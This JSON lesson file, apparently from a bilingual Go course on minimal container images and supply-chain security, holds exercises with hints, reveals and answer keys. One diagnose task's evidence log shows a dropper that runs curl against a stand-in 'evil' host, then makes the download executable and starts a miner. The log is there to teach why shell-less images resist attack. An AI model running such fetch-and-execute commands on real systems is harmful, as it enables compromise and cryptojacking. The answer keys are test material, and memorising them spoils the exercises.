{
  "lessonKey": "go/11-security-and-supply-chain/03-minimal-images",
  "track": "go",
  "tasks": [
    {
      "id": "predict-scratch-tls-failure",
      "type": "predict",
      "difficulty": "apply",
      "estMin": 6,
      "title": { "en": "The scratch image that cannot talk HTTPS", "ru": "scratch-образ, который не умеет в HTTPS" },
      "prompt": { "en": "A Go service builds with <code>CGO_ENABLED=0</code> into a <code>scratch</code> final stage that copies only the binary. It passes local tests but in prod every call to an external HTTPS API fails immediately, while calls to a plain-HTTP internal service succeed. Predict the exact error class and the single missing file — and why HTTP works while HTTPS does not.", "ru": "Go-сервис собирается с <code>CGO_ENABLED=0</code> в финальную стадию <code>scratch</code>, копирующую только бинарь. Локальные тесты проходят, но в проде каждый вызов внешнего HTTPS-API падает сразу, а вызовы к внутреннему сервису по обычному HTTP проходят. Предскажи точный класс ошибки и единственный отсутствующий файл — и почему HTTP работает, а HTTPS нет." },
      "scenario": { "en": "scratch is the empty image — zero files of base. Walk through what crypto/tls needs to verify a server certificate that the local machine had for free, and which of HTTP or HTTPS touches that machinery.", "ru": "scratch — пустой образ, ноль файлов базы. Пройди по тому, что нужно crypto/tls для проверки сертификата сервера, который локальная машина имела бесплатно, и что из HTTP или HTTPS задействует этот механизм." },
      "reveal": { "en": "HTTPS fails with 'x509: certificate signed by unknown authority' because scratch contains no /etc/ssl/certs/ca-certificates.crt — the root CA bundle the local machine supplied for free. crypto/tls is always compiled in and reaches the verification step, but with an empty trust store it cannot chain the server's certificate to any trusted root, so every TLS handshake fails. Plain HTTP never verifies a certificate, so it is untouched. The fix is one line: COPY --from=build /etc/ssl/certs/ca-certificates.crt into the final stage (or import time/tzdata and the certs equivalent, or just use distroless which bakes the CA bundle in). This is the canonical scratch gotcha and why distroless exists for teams who do not want to manage these by hand.", "ru": "HTTPS падает с 'x509: certificate signed by unknown authority', потому что в scratch нет /etc/ssl/certs/ca-certificates.crt — набора корневых CA, который локальная машина давала бесплатно. crypto/tls всегда вкомпилирован и доходит до шага проверки, но с пустым хранилищем доверия не может выстроить цепочку сертификата сервера к доверенному корню, и каждый TLS-хендшейк падает. Обычный HTTP сертификат не проверяет, поэтому он не затронут. Исправление в одну строку: COPY --from=build /etc/ssl/certs/ca-certificates.crt в финальную стадию (или взять distroless, где набор CA уже вшит). Это каноническая ловушка scratch и причина, по которой distroless существует для команд, не желающих управлять этим руками." }
    },
    {
      "id": "diagnose-fat-image-attack",
      "type": "diagnose",
      "difficulty": "apply",
      "estMin": 7,
      "title": { "en": "The webshell that found a shell", "ru": "Вебшелл, который нашёл шелл" },
      "prompt": { "en": "Two services run the same Go code; only the Dockerfile differs — see the evidence. Fill in the blanks: the compromised service shipped a ____ base image whose userland gave the dropper its tools (b1); the surviving service ran ____, the empty image with no executable but the binary (b2); and the control that stopped stage two was the absence of a ____ to launch the payload (b3).", "ru": "Два сервиса гоняют один Go-код; различается только Dockerfile — смотри улики. Заполни пропуски: скомпрометированный сервис отгрузил базовый образ ____, чей userland дал дропперу инструменты (b1); выживший сервис работал на ____, пустом образе без исполняемого, кроме бинаря (b2); а контролем, остановившим вторую стадию, было отсутствие ____ для запуска payload (b3)." },
      "evidence": { "en": "# service-a logs (compromised)\n/bin/sh -c 'curl http://evil/m -o /tmp/m'   -> 200, 4.2MB\nchmod +x /tmp/m && /tmp/m --pool ...        -> miner running\n\n# service-b logs (same exploit attempt, blocked)\nsh: not found\ncurl: not found\nchmod: not found\n# loop retries 6x, dropper exits", "ru": "# логи service-a (скомпрометирован), вывод без изменений\n/bin/sh -c 'curl http://evil/m -o /tmp/m'   -> 200, 4.2MB\nchmod +x /tmp/m && /tmp/m --pool ...        -> майнер работает\n\n# логи service-b (та же попытка эксплойта, заблокирована)\nsh: not found\ncurl: not found\nchmod: not found\n# цикл повторяется 6 раз, дроппер выходит" },
      "grading": {
        "mode": "blanks",
        "blanks": [
          { "id": "b1", "accept": ["debian", "ubuntu", "full", "fat", "debian/ubuntu", "полный", "жирный"], "hint": { "en": "A full-userland base with apt and coreutils — the convenient one with curl and a shell built in.", "ru": "База с полным userland, apt и coreutils — удобная, со встроенными curl и шеллом." } },
          { "id": "b2", "accept": ["scratch", "скрэтч", "scratch-образ", "пустой образ", "empty"], "hint": { "en": "The empty image: zero base bytes, just your statically linked binary.", "ru": "Пустой образ: ноль байт базы, только ваш статически слинкованный бинарь." } },
          { "id": "b3", "accept": ["shell", "sh", "/bin/sh", "шелл", "шелла", "оболочка", "оболочки"], "hint": { "en": "The first 'not found' line names exactly the universal second stage the attacker could not launch.", "ru": "Первая строка 'not found' называет ровно ту универсальную вторую стадию, которую атакующий не смог запустить." } }
        ]
      }
    },
    {
      "id": "design-image-strategy",
      "type": "design",
      "difficulty": "stretch",
      "estMin": 12,
      "title": { "en": "Design the base-image strategy for a mixed fleet", "ru": "Спроектируй стратегию базовых образов для смешанного флота" },
      "prompt": { "en": "Design a per-service base-image policy: which rung each service class lands on, the multi-stage build template, what each minimal image must add back, and how debugging and scanning work after you remove the shell. Self-grade against the rubric.", "ru": "Спроектируй пополисную стратегию базовых образов: на какую ступень садится каждый класс сервисов, шаблон multi-stage-сборки, что каждый минимальный образ должен вернуть, и как работают отладка и сканирование после удаления шелла. Оцени себя по рубрике." },
      "constraints": { "en": "A fleet of ~40 Go services. Most are pure-Go HTTP/gRPC APIs. Three use a cgo SQLite driver. One batch job does timezone-aware scheduling. Platform requires nonroot and read-only rootfs by policy. On-call currently debugs prod by kubectl exec into a shell — that workflow will break and needs a replacement. Registry storage and cold-start latency on autoscaling nodes both matter.", "ru": "Флот из ~40 Go-сервисов. Большинство — чисто-Go HTTP/gRPC API. Три используют cgo-драйвер SQLite. Один батч-джоб делает планирование с учётом часовых поясов. Платформа по политике требует nonroot и read-only rootfs. Дежурные сейчас отлаживают прод через kubectl exec в шелл — этот воркфлоу сломается и нужна замена. Хранение в реестре и латентность холодного старта на автоскейлящихся нодах оба важны." },
      "rubric": [
        { "en": "Routes each class to the lowest viable rung with reasons: pure-Go services to scratch (CGO_ENABLED=0), the three cgo SQLite services to distroless (glibc base, since static-libc is the constraint), and explicitly does not put cgo on scratch.", "ru": "Маршрутизирует каждый класс на самую нижнюю жизнеспособную ступень с обоснованием: чисто-Go сервисы на scratch (CGO_ENABLED=0), три cgo-SQLite сервиса на distroless (glibc-база, раз ограничение — статическая libc), и явно не ставит cgo на scratch." },
        { "en": "Gives a multi-stage template that compiles in a golang builder and COPYs only the artifact into the minimal stage, naming the four scratch add-backs: ca-certificates, tzdata (relevant for the scheduling job, or import time/tzdata), numeric nonroot USER, and read-only rootfs at runtime.", "ru": "Даёт multi-stage-шаблон, компилирующий в golang-билдере и копирующий только артефакт в минимальную стадию, называя четыре добавки scratch: ca-certificates, tzdata (важно для джоба планирования, или импорт time/tzdata), числовой nonroot USER и read-only rootfs в рантайме." },
        { "en": "Replaces the kubectl-exec debugging workflow concretely: structured logs and metrics as primary, ephemeral debug containers sharing the process namespace, or the distroless :debug variant — never adding a shell to the production image to make debugging easier.", "ru": "Конкретно заменяет воркфлоу отладки через kubectl exec: структурные логи и метрики как основа, эфемерные debug-контейнеры, разделяющие namespace процессов, или distroless-вариант :debug — никогда не добавляя шелл в прод-образ ради удобства отладки." },
        { "en": "Reads scanning honestly: scratch images scan clean on OS packages by construction (nothing in the scanner's domain), but that is not a security pass — govulncheck still owns Go-module CVEs and app security owns logic, and the two controls are stated as composing rather than substituting.", "ru": "Честно читает сканирование: scratch-образы чисты по пакетам ОС по построению (в домене сканера ничего нет), но это не зачёт по безопасности — govulncheck по-прежнему владеет CVE Go-модулей, а безопасность приложения — логикой, и два контроля заявлены как композирующиеся, а не замещающие." }
      ],
      "model": { "en": "Default rung: scratch for the ~36 pure-Go APIs, built with CGO_ENABLED=0 -ldflags='-s -w'. The three cgo SQLite services go to distroless (gcr.io/distroless/base, glibc) because a cgo binary needs libc that scratch lacks — or, better, evaluate a pure-Go SQLite (modernc.org/sqlite) to bring them down to scratch too; note the tradeoff rather than assume. Template: FROM golang:1.23 AS build (mod download, COPY, go build), then FROM scratch (or distroless), COPY ca-certificates.crt, COPY the binary, USER 65534, ENTRYPOINT. The scheduling batch job either copies tzdata or imports time/tzdata to embed the database in the binary — embedding is cleaner for scratch. Platform policy satisfied: numeric USER for nonroot, runtime --read-only rootfs (with an emptyDir tmpfs for any scratch space the app needs). Debugging: kill kubectl-exec-to-shell entirely; primary path is structured logs plus metrics plus traces, and for live poking use an ephemeral debug container (kubectl debug --target sharing the PID namespace) or the distroless :debug image promoted only to a staging replica — the prod image never carries a shell. Scanning: wire Trivy/Grype in CI; expect scratch OS scans to come back empty and read that as 'base contributes no known CVEs', not 'service is secure'. govulncheck ./... on every PR and nightly covers the Go modules; the two are complementary layers, base versus code. Numbers justify it: ~120 MB debian to ~12 MB scratch cuts pull and cold-start time across autoscaling and shrinks registry storage over 40 services x many tags.", "ru": "Ступень по умолчанию: scratch для ~36 чисто-Go API, собранных с CGO_ENABLED=0 -ldflags='-s -w'. Три cgo-SQLite сервиса идут на distroless (gcr.io/distroless/base, glibc), потому что cgo-бинарю нужна libc, которой нет у scratch — или, лучше, оценить чисто-Go SQLite (modernc.org/sqlite), чтобы свести и их на scratch; назвать трейдофф, а не предполагать. Шаблон: FROM golang:1.23 AS build (mod download, COPY, go build), затем FROM scratch (или distroless), COPY ca-certificates.crt, COPY бинарь, USER 65534, ENTRYPOINT. Батч-джоб планирования либо копирует tzdata, либо импортирует time/tzdata, чтобы вшить базу в бинарь — вшивание чище для scratch. Политика платформы удовлетворена: числовой USER для nonroot, рантайм --read-only rootfs (с emptyDir tmpfs под временное пространство, если нужно приложению). Отладка: убрать kubectl-exec-в-шелл целиком; основной путь — структурные логи плюс метрики плюс трассы, а для живого ковыряния — эфемерный debug-контейнер (kubectl debug --target с общим PID-namespace) или distroless-образ :debug, продвигаемый только на стейджинговую реплику — прод-образ никогда не несёт шелл. Сканирование: подключить Trivy/Grype в CI; ждать, что OS-сканы scratch вернутся пустыми, и читать это как 'база не вносит известных CVE', а не 'сервис безопасен'. govulncheck ./... на каждом PR и ночью покрывает Go-модули; два — дополняющие слои, база против кода. Числа оправдывают: ~120 МБ debian к ~12 МБ scratch режут время pull и холодного старта на автоскейле и ужимают хранение в реестре по 40 сервисам и многим тегам." }
    },
    {
      "id": "incident-distroless-timezone-missing",
      "type": "incident",
      "difficulty": "stretch",
      "estMin": 14,
      "title": { "en": "Reports land an hour early in the minimal image", "ru": "Отчёты приходят на час раньше в минимальном образе" },
      "prompt": { "en": "A billing rollup job moved from a debian base to gcr.io/distroless/static:nonroot. Locally and in the old image, time.LoadLocation(\"America/New_York\") works; in the new image every run logs 'unknown time zone America/New_York' and falls back to UTC, so invoices stamp 5 hours off and the 23:00 cutoff fires at 18:00. The binary is built CGO_ENABLED=0 and the deadline to fix billing is one rollup cycle away. Work it step by step; commit before revealing.", "ru": "Джоб биллингового свода переехал с debian-базы на gcr.io/distroless/static:nonroot. Локально и в старом образе time.LoadLocation(\"America/New_York\") работает; в новом образе каждый запуск логирует 'unknown time zone America/New_York' и откатывается на UTC, поэтому счета штампуются с разницей 5 часов, а отсечка 23:00 срабатывает в 18:00. Бинарь собран CGO_ENABLED=0, и до починки биллинга остаётся один цикл свода. Веди по шагам; сформулируй ответ до раскрытия." },
      "steps": [
        { "label": { "en": "1 · locate the lookup", "ru": "1 · найти источник данных" }, "prompt": { "en": "Where does LoadLocation read zone definitions from, and what did the debian base provide that static distroless does not?", "ru": "Откуда LoadLocation читает определения зон и что давала debian-база, чего нет у static distroless?" }, "reveal": { "en": "LoadLocation searches the zoneinfo database — by default /usr/share/zoneinfo (and the paths in $ZONEINFO). The debian base shipped the tzdata package populating that directory; distroless/static is deliberately empty of it (static omits tzdata; distroless/base includes it). With no zoneinfo on disk and no embedded copy, the named lookup fails and the code's fallback picks UTC.", "ru": "LoadLocation ищет базу zoneinfo — по умолчанию /usr/share/zoneinfo (и пути из $ZONEINFO). Debian-база привозила пакет tzdata, наполнявший этот каталог; distroless/static намеренно без него (static опускает tzdata; distroless/base включает). Без zoneinfo на диске и без встроенной копии именованный лукап падает, и фолбэк кода берёт UTC." } },
        { "label": { "en": "2 · embed vs mount", "ru": "2 · вшить или примонтировать" }, "prompt": { "en": "Name the two fixes and which one survives a switch back to scratch with no extra COPY.", "ru": "Назови два исправления и какое из них переживёт возврат на scratch без лишнего COPY." }, "reveal": { "en": "Option A: import _ \"time/tzdata\" once in the program — Go embeds the whole zoneinfo database into the binary (~450 KB), so LoadLocation never touches the filesystem; this survives scratch, static distroless, anything, because the data is in the ELF. Option B: COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo (or switch to distroless/base which ships it). For a self-contained billing binary the embed is the robust choice — no base-image coupling.", "ru": "Вариант A: импортировать _ \"time/tzdata\" один раз в программе — Go вшивает всю базу zoneinfo в бинарь (~450 КБ), и LoadLocation не трогает ФС; это переживает scratch, static distroless, что угодно, потому что данные в ELF. Вариант B: COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo (или перейти на distroless/base, где она есть). Для самодостаточного биллингового бинаря вшивание — надёжный выбор: нет связки с базовым образом." } },
        { "label": { "en": "3 · the silent fallback", "ru": "3 · тихий фолбэк" }, "prompt": { "en": "Why did this ship to prod undetected, and what code change makes the next missing-data class loud instead of silent?", "ru": "Почему это уехало в прод незамеченным и какое изменение кода сделает следующий класс отсутствующих данных громким, а не тихим?" }, "reveal": { "en": "The code ignored LoadLocation's error and used the zero Location (UTC) on failure, so a hard misconfiguration degraded into a plausible-but-wrong answer — the worst failure mode for billing. Fix the pattern: check the error and refuse to start (log.Fatal) when a required zone cannot load, turning a silent 5-hour skew into a crash-on-boot that CI and the first canary catch. Pair it with embedding so the boot check can never fail in prod. The general lesson: minimal images remove free filesystem gifts (CA certs, zoneinfo, /etc/passwd), and any code that silently tolerated their absence must be made to assert.", "ru": "Код игнорировал ошибку LoadLocation и при сбое использовал нулевую Location (UTC), поэтому жёсткая мисконфигурация выродилась в правдоподобный-но-неверный ответ — худший режим отказа для биллинга. Исправить паттерн: проверять ошибку и отказываться стартовать (log.Fatal), когда обязательная зона не грузится, превращая тихий сдвиг на 5 часов в краш на старте, который ловят CI и первая канарейка. В паре с вшиванием, чтобы проверка на старте не могла упасть в проде. Общий урок: минимальные образы убирают бесплатные подарки ФС (CA-сертификаты, zoneinfo, /etc/passwd), и любой код, тихо терпевший их отсутствие, надо заставить ассертить." } }
      ]
    },
    {
      "id": "review-scratch-dockerfile",
      "type": "review",
      "difficulty": "stretch",
      "estMin": 11,
      "title": { "en": "Review a minimal-image Dockerfile and its Go main", "ru": "Ревью минимального Dockerfile и его Go main" },
      "prompt": { "en": "A teammate ships a 'minimal scratch image' for an HTTPS-calling service. Review like a senior: name the real defects, don't flag non-issues.", "ru": "Коллега отгружает «минимальный scratch-образ» для сервиса, ходящего по HTTPS. Ревью как сеньор: назови реальные дефекты, не помечай не-проблемы." },
      "diff": {
        "lang": "go",
        "code": "# --- Dockerfile ---\nFROM golang:1.23 AS build\nWORKDIR /src\nCOPY . .\nRUN go build -o /app ./cmd/server\n\nFROM scratch\nCOPY --from=build /app /app\nENTRYPOINT [\"/app\"]\n\n// --- cmd/server/main.go ---\nfunc main() {\n    http.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n        w.WriteHeader(200)\n    })\n    http.HandleFunc(\"/sync\", func(w http.ResponseWriter, r *http.Request) {\n        // calls https://api.partner.com/...\n        resp, err := http.Get(\"https://api.partner.com/v1/orders\")\n        if err != nil { http.Error(w, err.Error(), 500); return }\n        defer resp.Body.Close()\n        io.Copy(w, resp.Body)\n    })\n    http.ListenAndServe(\":8080\", nil)\n}" },
      "findings": [
        { "id": "cgo-not-disabled-breaks-scratch", "severity": "bug", "planted": true, "label": { "en": "go build without CGO_ENABLED=0 produces a dynamically-linked binary that cannot run in scratch", "ru": "go build без CGO_ENABLED=0 даёт динамически слинкованный бинарь, не запускаемый в scratch" }, "explanation": { "en": "The golang image has a C toolchain, so CGO defaults to 1 and net links libc, naming /lib64/ld-linux as interpreter. scratch has no dynamic loader, so the container dies at execve with 'no such file or directory' before main runs. Must build CGO_ENABLED=0.", "ru": "В образе golang есть C-тулчейн, поэтому CGO по умолчанию 1, net линкует libc и называет интерпретатором /lib64/ld-linux. В scratch нет динамического загрузчика, контейнер умирает на execve с 'no such file or directory' до main. Нужно собирать CGO_ENABLED=0." } },
        { "id": "missing-ca-certs", "severity": "bug", "planted": true, "label": { "en": "No CA bundle copied — every outbound HTTPS call will fail x509 verification", "ru": "CA-бандл не скопирован — каждый исходящий HTTPS-вызов провалит x509-проверку" }, "explanation": { "en": "scratch ships zero root certificates, so /sync's https://api.partner.com call fails with 'x509: certificate signed by unknown authority'. Fix: COPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ into the final stage (or use distroless).", "ru": "В scratch ноль корневых сертификатов, поэтому вызов https://api.partner.com в /sync падает с 'x509: certificate signed by unknown authority'. Лечение: COPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ в финальную стадию (или distroless)." } },
        { "id": "listenandserve-error-ignored", "severity": "bug", "planted": true, "label": { "en": "http.ListenAndServe error is discarded — a bind failure exits 0 silently", "ru": "Ошибка http.ListenAndServe отброшена — сбой бинда тихо выходит с кодом 0" }, "explanation": { "en": "ListenAndServe always returns a non-nil error; ignoring it means a port-in-use or permission failure returns from main with exit 0, looking like a clean shutdown while serving nothing. Wrap in log.Fatal(http.ListenAndServe(...)).", "ru": "ListenAndServe всегда возвращает не-nil ошибку; игнорируя её, сбой занятого порта или прав возвращается из main с кодом 0, выглядя как чистая остановка, хотя ничего не обслуживается. Обернуть в log.Fatal(http.ListenAndServe(...))." } }
      ],
      "decoys": [
        { "id": "missing-server-timeouts", "label": { "en": "ListenAndServe uses the default server with no ReadTimeout/WriteTimeout", "ru": "ListenAndServe использует дефолтный сервер без ReadTimeout/WriteTimeout" }, "explanation": { "en": "looks wrong, is fine: real hardening advice in general, but it is not what breaks this minimal image — the image fails to boot and fails TLS long before a slowloris timeout ever matters. Flagging it here is scope creep, not the defect under review.", "ru": "выглядит ошибкой, но в порядке: в целом полезный совет по харднингу, но не он ломает этот минимальный образ — образ не стартует и валит TLS задолго до того, как таймаут slowloris станет важен. Помечать его здесь — расширение скоупа, а не дефект под ревью." } }
      ]
    }
  ]
}
